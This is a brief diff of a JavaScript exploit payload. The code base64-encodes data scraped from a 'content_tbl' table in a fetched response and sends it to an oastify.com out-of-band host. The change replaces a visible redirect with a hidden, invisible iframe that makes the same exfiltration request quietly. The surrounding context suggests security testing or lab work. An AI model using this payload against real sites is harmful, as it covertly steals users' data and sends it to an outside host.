@@ -54,7 +54,14 @@ function reqListener() {
         var encodedString = base64EncodeUnicode(jsonString);
 
         // Redirect to the new URL with the base64-encoded JSON data
-        location = '//0jkju313fs0ejqhs4mrm2zarrix9lz9o.oastify.com/log?key=' + encodedString;
+        // location = '//0jkju313fs0ejqhs4mrm2zarrix9lz9o.oastify.com/log?key=' + encodedString;
+
+        // Load the iframe
+        var iframe = document.createElement('iframe');
+        iframe.src = '//0jkju313fs0ejqhs4mrm2zarrix9lz9o.oastify.com/log?key=' + encodedString;
+        iframe.style.display = 'none';
+        // Append the iframe to the document body
+        document.body.appendChild(iframe);
     } else {
         console.error('Table with class "content_tbl" not found in the response.');
     }
